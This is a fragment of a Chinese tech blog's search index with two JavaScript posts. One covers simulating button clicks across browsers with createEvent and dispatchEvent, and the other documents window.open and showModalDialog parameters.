document.getElementById(<span class="string">"btn"</span>); <span class="regexp">//</span>通用方法 btn.onclick = function() &#123;    <span class="regexp">//sub</span>.click();    <span class="keyword">if</span> (<span class="regexp">/msie/i</span>.test(navigator.userAgent)) //IE    &#123;       <span class="function"><span class="keyword">sub</span>.<span class="title">fireEvent</span></span>("onclick");    &#125; <span class="keyword">else</span> &#123;       var e = document.createEvent(<span class="string">'MouseEvent'</span>);       e.initEvent(<span class="string">'click'</span>, false, false);       <span class="function"><span class="keyword">sub</span>.<span class="title">dispatchEvent</span></span>(e);    &#125;   &#125; &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>至此，问题解决，虽然这个问题很简单，但很容易被大家忽略，贴出来和大家一起分享。</p><p>语法：<br>createEvent(eventType)</p><p>参数 描述<br>eventType 想获取的 Event 对象的事件模块名。关于有效的事件类型列表，请参阅”说明”部分。<br>返回值</p><p>返回新创建的 Event 对象，具有指定的类型。</p><p>抛出</p><p>如果实现支持需要的事件类型，该方法将抛出代码为 NOT_SUPPORTED_ERR 的 DOMException 异常。</p><p>说明</p><p>该方法将创建一种新的事件类型，该类型由参数 eventType 指定。注意，该参数的值不是要创建的事件接口的名称，而是定义那个接口的 DOM 模块的名称。</p><p>下表列出了 eventType 的合法值和每个值创建的事件接口：</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">参数 事件接口 初始化方法</span><br><span class="line"><span class="selector-tag">HTMLEvents</span> <span class="selector-tag">HTMLEvent</span> <span class="selector-tag">iniEvent</span>()</span><br><span class="line"><span class="selector-tag">MouseEvents</span> <span class="selector-tag">MouseEvent</span> <span class="selector-tag">iniMouseEvent</span>()</span><br><span class="line"><span class="selector-tag">UIEvents</span> <span class="selector-tag">UIEvent</span> <span class="selector-tag">iniUIEvent</span>()</span><br></pre></td></tr></table></figure><p>用该方法创建了 Event 对象以后，必须用上表中所示的初始化方法初始化对象。关于初始化方法的详细信息，请参阅 Event 对象参考。</p><p>该方法实际上不是由 Document 接口定义的，而是由 DocumentEvent 接口定义的。如果一个实现支持 Event 模块，那么 Document 对象就会实现 DocumentEvent 接口并支持该方法。</p><pre><code></code></pre>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JS打开新窗口</title>
      <link href="/2012/12/15/js/JS%E6%89%93%E5%BC%80%E6%96%B0%E7%AA%97%E5%8F%A3/"/>
      <url>/2012/12/15/js/JS%E6%89%93%E5%BC%80%E6%96%B0%E7%AA%97%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">this.Page.RegisterStartupScript(&quot;key&quot;, &quot;&amp;lt;script&amp;gt;window.open(&apos;Error.aspx&apos;,target=&apos;blank&apos;)&amp;lt;/script&amp;gt;&quot;);</span><br><span class="line">this.Page.RegisterStartupScript(&quot;key&quot;, &quot;&amp;lt;script&amp;gt;window.open(&apos;Error.aspx&apos;,target=&apos;top&apos;)&amp;lt;/script&amp;gt;&quot;);</span><br><span class="line"></span><br><span class="line">window.open (&apos;page.html&apos;,&apos;newwindow&apos;,&apos;height=100,width=400,top=0,left=0,toolbar=no,menubar=no,scrollbars=no, resizable=no,location=no, status=no&apos;) </span><br><span class="line"></span><br><span class="line">脚本运行后，page.html将在新窗体newwindow中打开，宽为100，高为400，距屏顶0象素，屏左0象素，无工具条，无菜单条，无滚动条，不可调整大小，无地址栏，无状态栏。</span><br><span class="line">请对照。</span><br><span class="line">上例中涉及的为常用的几个参数，除此以外还有很多其他参数，请见四。</span><br><span class="line">四、各项参数</span><br><span class="line">其中yes/no也可使用1/0；pixel value为具体的数值，单位象素。</span><br><span class="line">参数 | 取值范围 |说明 </span><br><span class="line">| |alwaysLowered | yes/no |指定窗口隐藏在所有窗口之后 </span><br><span class="line">alwaysRaised | yes/no |指定窗口悬浮在所有窗口之上 </span><br><span class="line">depended | yes/no |是否和父窗口同时关闭 </span><br><span class="line">directories | yes/no |Nav2和3的目录栏是否可见 </span><br><span class="line">height | pixel value |窗口高度 </span><br><span class="line">hotkeys | yes/no |在没菜单栏的窗口中设安全退出热键 </span><br><span class="line">innerHeight | pixel value |窗口中文档的像素高度 </span><br><span class="line">innerWidth | pixel value |窗口中文档的像素宽度 </span><br><span class="line">location | yes/no |位置栏是否可见 </span><br><span class="line">menubar | yes/no |菜单栏是否可见 </span><br><span class="line">outerHeight | pixel value |设定窗口(包括装饰边框)的像素高度 </span><br><span class="line">outerWidth | pixel value |设定窗口(包括装饰边框)的像素宽度 </span><br><span class="line">resizable | yes/no |窗口大小是否可调整 </span><br><span class="line">screenX | pixel value |窗口距屏幕左边界的像素长度 </span><br><span class="line">screenY | pixel value |窗口距屏幕上边界的像素长度 </span><br><span class="line">scrollbars | yes/no |窗口是否可有滚动栏 </span><br><span class="line">titlebar | yes/no |窗口题目栏是否可见 </span><br><span class="line">toolbar | yes/no |窗口工具栏是否可见 </span><br><span class="line">Width | pixel value |窗口的像素宽度 </span><br><span class="line">z-look | yes/no |窗口被激活后是否浮在其它窗口之上</span><br><span class="line"></span><br><span class="line">window.showModalDialog使用手册</span><br><span class="line">基本介绍：</span><br><span class="line">showModalDialog() (IE 4+支持)</span><br><span class="line">showModelessDialog() (IE 5+支持)</span><br><span class="line">window.showModalDialog()方法用来创建一个显示HTML内容的模态对话框。</span><br><span class="line">window.showModelessDialog()方法用来创建一个显示HTML内容的非模态对话框。</span><br><span class="line">使用方法：</span><br><span class="line">vReturnValue =window.showModalDialog(sURL [, vArguments] [,sFeatures])</span><br><span class="line">vReturnValue =window.showModelessDialog(sURL [, vArguments] [,sFeatures])</span><br><span class="line">参数说明：</span><br><span class="line">sURL--必选参数，类型：字符串。用来指定对话框要显示的文档的URL。</span><br><span class="line">vArguments--可选参数，类型：变体。用来向对话框传递参数。传递的参数类型不限，包括数组等。对话框通过window.dialogArguments来取得传递进来的参数。</span><br><span class="line">sFeatures--可选参数，类型：字符串。用来描述对话框的外观等信息，可以使用以下的一个或几个，用分号“;”隔开。</span><br><span class="line">1.dialogHeight :对话框高度，不小于１００px，ＩＥ４中dialogHeight 和 dialogWidth 默认的单位是em，而ＩＥ５中是px，为方便其见，在定义modal方式的对话框时，用px做单位。</span><br><span class="line">2.dialogWidth: 对话框宽度。</span><br><span class="line">3.dialogLeft: 离屏幕左的距离。</span><br><span class="line">4.dialogTop: 离屏幕上的距离。</span><br><span class="line">5.center: &#123;yes | no | 1| 0&#125;：窗口是否居中，默认yes，但仍可以指定高度和宽度。</span><br><span class="line">6.help: &#123;yes | no | 1| 0&#125;：是否显示帮助按钮，默认yes。</span><br><span class="line">7.resizable: &#123;yes | no | 1| 0&#125; ［ＩＥ５＋］：是否可被改变大小。默认no。</span><br><span class="line">8.status: &#123;yes | no | 1| 0&#125; ［IE5+］：是否显示状态栏。默认为yes[ Modeless]或no[Modal]。</span><br><span class="line">9.scroll:&#123; yes | no | 1| 0| on |off &#125;：指明对话框是否显示滚动条。默认为yes。</span><br><span class="line">下面几个属性是用在HTA中的，在一般的网页中一般不使用。</span><br><span class="line">10.dialogHide:&#123; yes | no | 1| 0| on |off &#125;：在打印或者打印预览时对话框是否隐藏。默认为no。</span><br><span class="line">11.edge:&#123; sunken |raised &#125;：指明对话框的边框样式。默认为raised。</span><br><span class="line">12.unadorned:&#123; yes | no | 1| 0| on | off &#125;：默认为no。</span><br></pre></td></tr></table></figure><p>&nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
